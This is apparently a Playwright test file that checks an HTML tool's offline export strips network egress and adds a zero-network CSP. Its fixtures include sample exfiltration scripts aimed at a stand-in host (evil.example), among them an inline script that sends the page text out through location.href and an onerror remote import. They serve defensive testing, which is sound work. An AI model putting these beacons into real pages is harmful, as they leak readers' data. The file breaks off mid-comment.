import { test, expect } from "@playwright/test";
import { execFileSync } from "child_process";
import fs from "fs";
import path from "path";
import zlib from "zlib";
import {
  DEV, SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
  installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonShareable,
  clickSidebarExport,
} from "./helpers.js";

const CONTENT = `
<h1>Offline export</h1>
<p id="offline-note">This paragraph proves embedded comments travel in the offline file.</p>
<img id="remoteTracker" alt="Remote tracker" src="https://example.com/tracker.png" srcset="https://example.com/tracker-2x.png 2x">
<iframe id="remoteFrame" title="Remote frame" src="https://example.com/beacon.html"></iframe>
<pre class="mermaid cm-skip">
flowchart LR
  A[Alpha] --> B[Beta]
</pre>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.js"></script>
<figure class="chart" aria-labelledby="offline-chart-cap">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px; max-height: 180px; overflow: hidden;">
    <canvas id="offlineChart" width="360" height="180" role="img" aria-label="Offline export Chart.js bar chart"></canvas>
  </div>
  <figcaption id="offline-chart-cap">Chart.js chart for offline export.</figcaption>
</figure>
<script>
(function () {
  var el = document.getElementById("offlineChart");
  if (!el || typeof Chart === "undefined") return;
  new Chart(el, {
    type: "bar",
    data: {
      labels: ["one", "two", "three"],
      datasets: [{ label: "Values", data: [4, 9, 6], backgroundColor: "#4a7fb5" }]
    },
    options: {
      animation: false,
      responsive: false,
      plugins: { legend: { display: false } },
      scales: { y: { beginAtZero: true } }
    }
  });
})();
</script>
<script type="module">
import "https://example.com/bare-module.js";
</script>`;

async function routeRichContentLocal(page) {
  const mermaidRoot = path.join(DEV, "node_modules", "mermaid");
  const mermaidVersion = JSON.parse(fs.readFileSync(path.join(mermaidRoot, "package.json"), "utf8")).version;
  const chartRoot = path.join(DEV, "node_modules", "chart.js");
  await page.route(/^https?:\/\//, async (route) => {
    const url = route.request().url();
    if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
    const u = new URL(url);
    if (/cdn\.jsdelivr\.net\/npm\/mermaid@/.test(url)) {
      const reqMajor = (u.pathname.match(/mermaid@(\d+)/) || [])[1];
      if (reqMajor && reqMajor !== String(mermaidVersion).split(".")[0]) {
        throw new Error(`mermaid version mismatch: template requests @${reqMajor}, vendored is ${mermaidVersion}`);
      }
      const rel = u.pathname.replace(/^\/npm\/mermaid@[^/]+\//, "");
      try {
        const body = fs.readFileSync(path.join(mermaidRoot, rel));
        return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
      } catch (e) {
        return route.abort();
      }
    }
    if (/cdn\.jsdelivr\.net\/npm\/chart\.js@/.test(url)) {
      const body = fs.readFileSync(path.join(chartRoot, "dist", "chart.umd.js"));
      return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
    }
    return route.abort();
  });
}

function makeTmpDir() {
  const repoRoot = path.resolve(DEV, "..", "..", "..");
  const tmpRoot = path.join(repoRoot, "tmp");
  fs.mkdirSync(tmpRoot, { recursive: true });
  return fs.mkdtempSync(path.join(tmpRoot, "cmh_offline_"));
}

async function installDownloadTextCapture(page) {
  await page.addInitScript(() => {
    window.__cmhDownloadTexts = [];
    const originalCreateObjectURL = URL.createObjectURL.bind(URL);
    URL.createObjectURL = (blob) => {
      if (blob && String(blob.type || "").includes("text/html")) {
        blob.text().then((text) => window.__cmhDownloadTexts.push(text));
      }
      return originalCreateObjectURL(blob);
    };
  });
}

async function capturedDownloadText(page) {
  await page.waitForFunction(() => window.__cmhDownloadTexts && window.__cmhDownloadTexts.length > 0);
  return page.evaluate(() => window.__cmhDownloadTexts[window.__cmhDownloadTexts.length - 1]);
}

function layerDescriptor(html) {
  const m = html.match(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/i);
  if (!m) throw new Error("missing layer descriptor");
  return JSON.parse(m[2]);
}

function realLayerDescriptorScripts(html) {
  const head = html.slice(0, html.indexOf(CONTENT_BEGIN));
  return [...head.matchAll(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/gi)];
}

function insertLayerDecoy(html) {
  const decoy = '<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>';
  const marker = '<script type="application/json" id="commentableHtmlLayer">';
  if (!html.includes(marker)) throw new Error("missing real layer descriptor marker");
  return html.replace(marker, decoy + "\n" + marker);
}

const EXPECTED_LAYER_REGIONS = ["CSS", "HANDLED IDS", "EMBEDDED COMMENTS", "COMMENT UI", "JS"];
const CONTENT_BEGIN = "<!-- BEGIN: commentable-html - CONTENT (agent edits ONLY between these markers) -->";
const CONTENT_END = "<!-- END: commentable-html - CONTENT -->";

function escapeRegExp(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function markerLine(kind, region) {
  return new RegExp(
    `^[ \\t]*(?:<!--[ \\t]*)?(?:/\\*[ \\t]*)?(?:=+[ \\t]*)?${
      escapeRegExp(`${kind}: commentable-html - ${region}`)
    }[ \\t]*(?:=+[ \\t]*)?(?:-->|\\*/)?[ \\t]*$`,
    "gm"
  );
}

function expectForwardCompatibleContract(html, mode) {
  const descriptor = layerDescriptor(html);
  expect(descriptor.mode).toBe(mode);
  expect(descriptor.regions).toEqual(EXPECTED_LAYER_REGIONS);

  let lastBegin = -1;
  for (const region of EXPECTED_LAYER_REGIONS) {
    const begins = [...html.matchAll(markerLine("BEGIN", region))];
    const ends = [...html.matchAll(markerLine("END", region))];
    expect(begins, `BEGIN marker for ${region}`).toHaveLength(1);
    expect(ends, `END marker for ${region}`).toHaveLength(1);
    expect(begins[0].index).toBeLessThan(ends[0].index);
    expect(begins[0].index).toBeGreaterThan(lastBegin);
    lastBegin = begins[0].index;
  }

  const begin = html.indexOf(CONTENT_BEGIN);
  const end = html.indexOf(CONTENT_END);
  expect(begin).toBeGreaterThan(-1);
  expect(end).toBeGreaterThan(begin);
  const beforeContent = html.slice(0, begin);
  const rootMatches = [...beforeContent.matchAll(/<main\b[^>]*\bid=(["'])commentRoot\1[^>]*>/gi)];
  expect(rootMatches).toHaveLength(1);
  expect(rootMatches[0][0]).toContain("data-cmh-content-root");
  expect(html.indexOf("</main>", end)).toBeGreaterThan(end);
}

function mediaLoadAttributes(html) {
  const refs = [];
  const tagRe = /<(script|link|img|source|iframe|video|audio|object|embed|track|image|use|input|meta|body|table|td|th|form|button)\b[^>]*>/gi;
  for (const tag of html.matchAll(tagRe)) {
    for (const attr of tag[0].matchAll(/\s(href|xlink:href|src|srcset|poster|data|background|content|action|formaction)\s*=\s*["']([^"']+)["']/gi)) {
      refs.push({ tag: tag[1].toLowerCase(), attr: attr[1].toLowerCase(), value: attr[2] });
    }
  }
  return refs;
}

function networkLoadRefs(html) {
  const refs = [];
  for (const item of mediaLoadAttributes(html)) {
    const values = item.attr === "srcset" ? item.value.split(",").map((part) => part.trim().split(/\s+/)[0]) : [item.value];
    for (const value of values) {
      if (/^(?:https?:)?\/\//i.test(value)) refs.push(value);
    }
  }
  return refs;
}

function cspMetaContent(html) {
  const m = html.match(/<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/i);
  if (!m) return "";
  const c = m[0].match(/\scontent=(["'])([\s\S]*?)\1/i);
  return c ? c[2] : "";
}

test("Export Offline embeds vendored mermaid and Chart.js for zero-network reopen (CMH-OFFLINE-01, CMH-OFFLINE-02)", async ({ page, browser }) => {
  test.setTimeout(60000);
  expect(networkLoadRefs(CONTENT)).toEqual(expect.arrayContaining([
    "https://example.com/tracker.png",
    "https://example.com/tracker-2x.png",
    "https://example.com/beacon.html",
  ]));
  const staged = stageContent(CONTENT, { key: "cmh-offline-export", source: "offline-export.html" });
  fs.writeFileSync(staged.html, insertLayerDecoy(fs.readFileSync(staged.html, "utf8")));
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await page.waitForFunction(() => !!(window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart")), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    await page.keyboard.press("Escape");
    await addTextComment(page, "#offline-note", "offline note with import('https://evil.example/x.js') survives");
    await expect(page.locator("#btnSidebarExportMenu")).toBeVisible();
    await openSidebarExportMenu(page);
    await expect(page.locator("#btnExportOffline")).toBeVisible();

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expectForwardCompatibleContract(exportedHtml, "offline");
    expect(realLayerDescriptorScripts(exportedHtml)).toHaveLength(1);
    expect(exportedHtml).toContain('<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>');
    expect(exportedHtml).toContain('id="embeddedComments"');
    expect(exportedHtml).toContain('<canvas id="offlineChart"');
    expect(exportedHtml).not.toContain('data-cm-offline-chart="true"');
    expect(exportedHtml).not.toContain('<img id="offlineChart"');
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/chart.js");
    expect(exportedHtml).not.toContain("bare-module.js");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-export.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-live", "polite");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-label", /Offline: self-contained and works with no network/);
    await expect(page2.locator("#commentList")).toContainText("offline note with import('https://evil.example/x.js') survives");

    const mediaState = await page2.evaluate(() => {
      const img = document.getElementById("remoteTracker");
      const iframe = document.getElementById("remoteFrame");
      return {
        imgSrc: img && img.getAttribute("src"),
        imgSrcset: img && img.getAttribute("srcset"),
        iframeSrc: iframe && iframe.getAttribute("src"),
      };
    });
    expect(mediaState.imgSrc || "").not.toMatch(/^(?:https?:)?\/\//i);
    expect(mediaState.imgSrcset).toBeNull();
    expect(mediaState.iframeSrc).toBeNull();

    const mermaid = page2.locator("#commentRoot pre.mermaid svg").first();
    await expect(mermaid).toBeVisible();
    await page2.locator("#commentRoot pre.mermaid svg g.node").first().hover();
    await expect(page2.locator("#mermaidAddBtn")).toBeVisible();

    const chart = page2.locator("canvas#offlineChart");
    await expect(chart).toBeVisible();
    const chartMetrics = await page2.evaluate(() => {
      const canvas = document.getElementById("offlineChart");
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      if (!canvas || !chart) return null;
      const rect = canvas.getBoundingClientRect();
      const active = [{ datasetIndex: 0, index: 1 }];
      if (chart.setActiveElements) chart.setActiveElements(active);
      if (chart.tooltip && chart.tooltip.setActiveElements) {
        chart.tooltip.setActiveElements(active, {
          x: rect.left + rect.width / 2,
          y: rect.top + 20,
        });
      }
      chart.update("none");
      return {
        width: rect.width,
        height: rect.height,
        tooltipOpacity: chart.tooltip && typeof chart.tooltip.opacity === "number" ? chart.tooltip.opacity : 0,
        datasets: chart.data && chart.data.datasets ? chart.data.datasets.length : 0,
        chartAreaWidth: chart.chartArea ? chart.chartArea.right - chart.chartArea.left : 0,
      };
    });
    expect(chartMetrics).toBeTruthy();
    expect(chartMetrics.datasets).toBe(1);
    expect(chartMetrics.width).toBeGreaterThan(20);
    expect(chartMetrics.height).toBeGreaterThan(20);
    expect(chartMetrics.chartAreaWidth).toBeGreaterThan(20);
    expect(chartMetrics.tooltipOpacity).toBeGreaterThan(0);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline embeds the MIT license notice beside each inlined library (CMH-LICENSE-02)", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-notice", source: "offline-notice.html" });
  // Seed a STALE library notice into the document head on disk (as a hypothetical earlier offline
  // pass would leave). The offline export's base HTML carries it, so this exercises the idempotency
  // strip: _stripOfflineRichRenderers must drop the stale notice before the export re-emits one.
  const staleNotice = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nSTALE DUPLICATE\n-->";
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace("</head>", staleNotice + "\n</head>"));
  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#offline-note", "notice check");
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    // Both libraries are inlined for this doc, so both MIT notices must travel with them, each inside
    // an HTML comment (a notice, not executable content) that carries the verbatim upstream copyright.
    const comments = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
    const mermaidNotice = comments.find((c) => c.includes("Third-party notice - mermaid"));
    const chartNotice = comments.find((c) => c.includes("Third-party notice - Chart.js"));
    expect(mermaidNotice, "mermaid MIT notice comment").toBeTruthy();
    expect(chartNotice, "Chart.js MIT notice comment").toBeTruthy();
    expect(mermaidNotice).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(mermaidNotice).toContain("Permission is hereby granted");
    expect(chartNotice).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(chartNotice).toContain("Permission is hereby granted");
    // Idempotent: exactly one notice per library - the seeded stale mermaid notice was stripped and
    // re-emitted once, never duplicated.
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    expect(exportedHtml).not.toContain("STALE DUPLICATE");
    // The notice is a comment, never an executed script, so it cannot run and stays under the CSP.
    expect(exportedHtml).not.toContain("Third-party notice - mermaid is bundled inline for offline use under the MIT License:</script>");
  } finally {
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("editing an already-offline document preserves offline mode and offline export is idempotent (CMH-OFFLINE-03)", async ({ page }) => {
  const offlineContent = `
<h1>Already offline</h1>
<p id="offline-preserve-note">Offline files can still collect review notes.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip">
    <img id="offlinePreservedChart" class="cmh-chart" data-cm-offline-chart="true"
      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/l1pK4wAAAABJRU5ErkJggg=="
      alt="Offline chart snapshot" width="1" height="1">
  </div>
  <figcaption>Offline chart snapshot.</figcaption>
</figure>`;
  const staged = stageContent(offlineContent, { key: "cmh-offline-preserve", source: "offline-preserve.html" });
  const html = fs.readFileSync(staged.html, "utf8")
    .replace('"mode":"shareable"', '"mode":"offline"', 1);
  fs.writeFileSync(staged.html, html);
  try {
    await installClipboardCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await expect(page.locator("#cmTypeBadge")).toHaveText("Offline");
    await addTextComment(page, "#offline-preserve-note", "preserve this offline note");

    const [shareableDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnSaveHtml"),
    ]);
    const shareableHtml = await readDownload(shareableDownload);
    expect(layerDescriptor(shareableHtml).mode).toBe("offline");
    expect(shareableHtml).toContain("preserve this offline note");
    expect(shareableHtml).toContain('data-cm-offline-chart="true"');
    expect(mediaLoadAttributes(shareableHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(shareableHtml)).toEqual([]);

    const [offlineDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const offlineHtml = await readDownload(offlineDownload);
    expect(layerDescriptor(offlineHtml).mode).toBe("offline");
    expect((offlineHtml.match(/data-cm-offline-chart="true"/g) || []).length).toBe(1);
    expect(mediaLoadAttributes(offlineHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(offlineHtml)).toEqual([]);
    expect(offlineHtml).not.toContain('<canvas id="offlinePreservedChart"');
    expect(offlineHtml).toContain("preserve this offline note");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and event-handler egress (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_EGRESS = `
<h1>Offline zero network</h1>
<style>
@import "https://evil.example/imported.css";
.remote-bg { background-image: url("//evil.example/bg.png"); }
</style>
<link rel="prefetch" href="https://evil.example/prefetch.js">
<link rel="prerender" href="https://evil.example/prerender.html">
<meta http-equiv="refresh" content="9999; url=https://evil.example/refresh">
<p id="egress-note">Offline export must strip every load vector.</p>
<img id="sameOriginBeacon" alt="same origin beacon" src="__SAME_ORIGIN__/same-origin.png">
<img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
<svg width="20" height="20" aria-label="remote svg refs">
  <image href="https://evil.example/vector.png" width="20" height="20"></image>
  <use href="https://evil.example/sprite.svg#icon"></use>
  <image xlink:href="https://evil.example/vector-xlink.png" width="20" height="20"></image>
  <use xlink:href="https://evil.example/sprite-xlink.svg#icon"></use>
</svg>
<video poster="https://evil.example/poster.png"><track src="https://evil.example/captions.vtt"></video>
<video src="https://evil.example/video.mp4"><source src="https://evil.example/video-source.mp4" srcset="https://evil.example/video-2x.png 2x"></video>
<audio src="https://evil.example/audio.mp3"><source src="https://evil.example/audio-source.ogg"></audio>
<input type="image" alt="submit" src="https://evil.example/input.png">
<div background="https://evil.example/background.png">legacy background</div>
<script>const u = "https://evil.example/dynamic-import.js"; import(u);</script>`;
  const staged = stageContent(CONTENT_WITH_EGRESS, { key: "cmh-offline-zero-network", source: "offline-zero.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    fs.writeFileSync(path.join(staged.dir, "same-origin.png"), Buffer.from("not a real image"));
    fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(/__SAME_ORIGIN__/g, server.url));
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    const csp = cspMetaContent(exportedHtml);
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'unsafe-inline'");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    const handlerTag = exportedHtml.match(/<img\b[^>]*id="handlerProbe"[^>]*>/i);
    expect(handlerTag && handlerTag[0]).toBeTruthy();
    expect(handlerTag[0]).not.toMatch(/\sonerror\s*=/i);
    expect(exportedHtml).not.toContain("evil.example");
    expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
    expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
    expect(exportedHtml).not.toMatch(/<meta\b[^>]*http-equiv=["']refresh/i);
    expect(exportedHtml).not.toMatch(/@import\s/i);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-zero.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline neutralizes form posts and preserves safe canvas scripts (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_FORMS_AND_CANVAS = `
<h1>Offline forms and canvas</h1>
<p id="form-canvas-note">Network form targets must not survive offline export.</p>
<form id="remoteForm" action="https://evil.example/post">
  <button id="remoteButton" formaction="//evil.example/button">Send</button>
  <input id="remoteInput" formaction="https://evil.example/input" value="Send">
</form>
<div class="cm-skip"><canvas id="customCanvas" width="20" height="20" role="img" aria-label="Custom canvas"></canvas></div>
<script>
(function () {
  window.__benignImportCommentKept = true;
  if (false) import("./local-module.js");
  // This comment has slashes but no network dynamic import.
})();
</script>
<script>
(function () {
  var canvas = document.getElementById("customCanvas");
  var ctx = canvas && canvas.getContext("2d");
  if (!ctx) return;
  ctx.fillStyle = "#ff0000";
  ctx.fillRect(0, 0, 20, 20);
  window.__customCanvasDrew = true;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_FORMS_AND_CANVAS, { key: "cmh-offline-forms-canvas", source: "offline-forms-canvas.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    expect(exportedHtml).toContain("window.__benignImportCommentKept = true");
    expect(exportedHtml).toContain("window.__customCanvasDrew = true");
    for (const id of ["remoteForm", "remoteButton", "remoteInput"]) {
      const tag = exportedHtml.match(new RegExp(`<[^>]+id=["']${id}["'][^>]*>`, "i"));
      expect(tag && tag[0]).toBeTruthy();
      expect(tag[0]).not.toMatch(/\s(?:action|formaction)\s*=/i);
    }

    const exportedPath = path.join(outDir, "offline-forms-canvas.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => ({
      importCommentKept: window.__benignImportCommentKept === true,
      customCanvasDrew: window.__customCanvasDrew === true,
      pixel: Array.from(document.getElementById("customCanvas").getContext("2d").getImageData(1, 1, 1, 1).data),
    }));
    expect(state.importCommentKept).toBe(true);
    expect(state.customCanvasDrew).toBe(true);
    expect(state.pixel.slice(0, 3)).toEqual([255, 0, 0]);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("a preserved inline script cannot beacon by navigating the offline file to a remote URL (CMH-OFFLINE-05)", async ({ page, browser }) => {
  // The zero-network CSP blocks every SUBRESOURCE channel but cannot restrict TOP-LEVEL
  // NAVIGATION: `navigate-to` was dropped from CSP Level 3 and ships in no browser, and
  // `sandbox` is ignored when the policy arrives in a <meta>. So a script the export
  // deliberately preserves (CMH-OFFLINE-04) could exfiltrate the whole document - every
  // reviewer comment included - simply by assigning `location.href`. The exporter therefore
  // strips a direct scripted navigation to a network URL the same way it strips a remote
  // dynamic import. The beacon is armed only under `file:` so the SOURCE document, which the
  // exporter reads over http, is not the thing that navigates away.
  const CONTENT_WITH_NAVIGATION = `
<h1>Offline navigation egress</h1>
<p id="nav-note">A preserved inline script must not be able to beacon by navigating away.</p>
<meta name="referrer" content="unsafe-url">
<meta http-equiv="Referrer-Policy" content="unsafe-url">
<a id="docsLink" href="https://docs.example.org/guide" referrerpolicy="unsafe-url">Docs</a>
<script>
(function () {
  window.__cmhExfilRan = true;
  if (location.protocol === "file:") {
    location.href = "https://evil.example/steal?data=" + encodeURIComponent(document.body.innerText);
  }
})();
</script>
<script>
(function () {
  window.__cmhOpenExfilRan = true;
  if (location.protocol === "file:") window.open("https://evil.example/popup");
})();
</script>
<script>
(function () {
  // A prefix CHAIN used to clear the strip - typing "window." in front of the sink is not a
  // meaningful obstacle, so the pattern must follow the whole chain.
  window.__cmhChainExfilRan = true;
  if (location.protocol === "file:") window.top.location.href = "https://evil.example/chain";
})();
</script>
<script>
(function () {
  // A URL literal spelled WITHOUT the slashes after the scheme. A browser resolves
  // "https:evil.example/x" to "https://evil.example/x", so this beacons exactly as well as the
  // direct assignment above while needing no aliasing, no computed access and no obfuscation.
  window.__cmhSchemeOnlyExfilRan = true;
  if (location.protocol === "file:") location.href = "https:evil.example/scheme-only";
})();
</script>
<script>
(function () {
  // Control: a bare "https:" scheme string and a COMPARISON against a scheme-only URL. Widening
  // the URL literal to catch the beacon above must not start deleting these.
  window.__cmhSchemeStringKept = "https:";
  if (location.href === "https:api.example.org/v1") document.title = "same";
})();
</script>
<script>
(function () {
  // Control: mentions both a navigation object and a network URL literal, but never
  // navigates to one. A strip that deleted this would break benign authored documents.
  window.__cmhBenignLocationKept = true;
  var DOCS_URL = "https://docs.example.org/guide";
  if (location.hash === "#docs" && location.href !== DOCS_URL) document.title = "docs";
})();
</script>
<script>
(function () {
  // Control: a LOCAL binding that merely happens to be named "location", and a local helper
  // named "open". Neither navigates anything, and deleting the whole script over them would
  // silently break an ordinary authored document - the costlier failure direction.
  var location = "https://api.example.org/v1";
  var open = function (u) { window.__cmhLocalOpenArg = u; };
  open("https://docs.example.org/guide");
  window.__cmhLocalShadowKept = location;
})();
</script>
<script>
(function () {
  // Control: a shadowed location OBJECT whose href is then assigned. This is the shape the
  // sink pattern matches literally, yet it navigates nothing - only the local object changes.
  var location = { href: "" };
  location.href = "https://api.example.org/v1";
  window.__cmhShadowedHrefKept = location.href;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_NAVIGATION, { key: "cmh-offline-navigation", source: "offline-navigation.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("evil.example");
    expect(exportedHtml).toContain("window.__cmhBenignLocationKept = true");
    expect(exportedHtml).toContain('window.__cmhSchemeStringKept = "https:"');
    // The costlier failure direction: a benign script that merely SHADOWS `location` / `open`
    // with local bindings must survive intact, or an ordinary authored document is silently
    // broken by the export.
    expect(exportedHtml).toContain("window.__cmhLocalShadowKept = location");
    expect(exportedHtml).toContain("window.__cmhShadowedHrefKept = location.href");
    // Removing a script is content loss, so the user is told rather than left to guess - and the
    // COUNT must be right, or a miscount regression would read as a pass. Matched with a word
    // boundary, since a plain substring would also be satisfied by "14 scripts ... removed.".
    await expect(page.locator("#toast")).toContainText(/\b4 scripts that load or navigate to the network were removed\./);
    // A navigation that does still happen (a user-clicked link, or a script that builds the
    // URL dynamically) must at least not leak where it came from. The fixture authors a
    // PERMISSIVE `unsafe-url` policy both as a document meta and on the anchor itself, so this
    // fails unless the export really replaces the meta and strips the attribute.
    const referrerMetas = exportedHtml.match(/<meta\b[^>]*\bname=["']referrer["'][^>]*>/gi) || [];
    expect(referrerMetas).toHaveLength(1);
    expect(referrerMetas[0]).toMatch(/content=["']no-referrer["']/i);
    expect(exportedHtml).not.toMatch(/content=["']unsafe-url["']/i);
    expect(exportedHtml).not.toMatch(/http-equiv=["']Referrer-Policy["']/i);
    expect(exportedHtml).not.toMatch(/\sreferrerpolicy\s*=/i);

    const exportedPath = path.join(outDir, "offline-navigation.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    // The strict validator must not bless a hand-authored offline file that keeps the same
    // shape: the strip and the gate have to agree, or the gate certifies a file the exporter
    // no longer protects. The scheme-only spelling is checked in the same direction, since a
